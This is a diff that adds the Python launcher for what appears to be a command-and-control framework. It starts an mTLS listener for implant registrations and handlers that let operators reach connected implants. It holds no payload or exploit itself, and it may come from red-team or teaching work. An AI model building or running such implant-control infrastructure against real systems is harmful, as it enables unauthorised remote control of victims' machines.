@@ -1,0 +1,48 @@
+#!/usr/bin/env python3
+import logging
+import traceback
+
+from server.mtls.mtls import Listener
+from server.implant_handler.implant_handler import ImplantHandler
+from server.operator_handler.operator_handler import OperatorHandler
+from client.util.util import parseEndpoint
+from queue import Queue
+
+def main():
+    logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
+
+    try:
+        implant_endpoint = parseEndpoint(input("Enter Implant Listener Address (Example: 172.17.0.2:31337)\n> "))
+        operator_endpoint = parseEndpoint(input("Enter Operator Listener Address (Example: 172.17.0.2:31337)\n> "))
+    except KeyboardInterrupt:
+        exit()
+
+    print("Listening for implants...")
+    print("Listening for operators...")
+
+    requestq = Queue() #this is a shared queue between the handler and the listner, which fills with implant registration
+
+    try:
+        implant_listener = Listener(requestq, implant_endpoint) #begins implant listener w/ mtls encryption
+    except Exception as e:
+        print(e)
+        traceback.print_exc()
+        exit(1)
+
+    operators = list()
+    implants = list() # implant is a pair of a registration and id
+
+    implant_handler = ImplantHandler(requestq, operators, implants)
+    implant_handler.start()
+
+    operator_handler = OperatorHandler(operator_endpoint, operators, implant_listener.sessions, implants)
+    operator_handler.start()
+
+    try:
+        while True:
+            pass
+    except KeyboardInterrupt:
+        exit()
+
+if __name__ == "__main__":
+    main()
